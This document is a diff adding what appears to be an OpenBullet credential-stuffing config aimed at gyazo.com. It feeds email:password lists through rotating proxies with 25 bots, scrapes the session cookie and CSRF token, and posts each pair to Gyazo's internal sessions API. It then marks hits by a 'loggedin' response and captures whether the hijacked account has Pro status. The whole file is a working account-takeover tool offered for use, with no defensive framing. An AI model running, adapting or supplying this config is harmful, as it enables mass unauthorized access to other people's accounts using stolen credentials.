@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Gyazo",
+  "SuggestedBots": 25,
+  "LastModified": "2018-07-13T02:56:03.6744418+00:00",
+  "AdditionalInfo": "",
+  "Author": "Robot",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://gyazo.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#SESSION PARSE "<COOKIES(Gyazo_session)>" LR "" "" Recursive=FALSE -> VAR "SESSION" "" "" 
+#CSRF PARSE "<SOURCE>" LR "csrf-token\" content=\"" "\" /><link rel=\"alternate\"" Recursive=FALSE -> VAR "CSRF" "" "" 
+#POST REQUEST POST "https://gyazo.com/api/internal/sessions" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"origin\":null,\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  COOKIE "Gyazo_session: <SESSION>" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://gyazo.com" 
+  HEADER "referer: https://gyazo.com/login" 
+  HEADER "X-Runtime: <XRUN>" 
+  HEADER "X-Request-Id: <XREQ>" 
+  HEADER "Via: 1.1 google" 
+  HEADER "Alt-Svc: clear" 
+  HEADER "Strict-Transport-Security: max-age=15552000" 
+  HEADER "x-csrf-token: <CSRF>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "loggedin" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password" 
+#INFO REQUEST GET "https://gyazo.com/api/internal/settings" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-csrf-token: <CSRF>" 
+  HEADER "referer: https://gyazo.com/settings" 
+#PRO PARSE "<SOURCE>" LR "downgrade\":" ",\"" Recursive=FALSE -> CAP "Pro" "" "" 
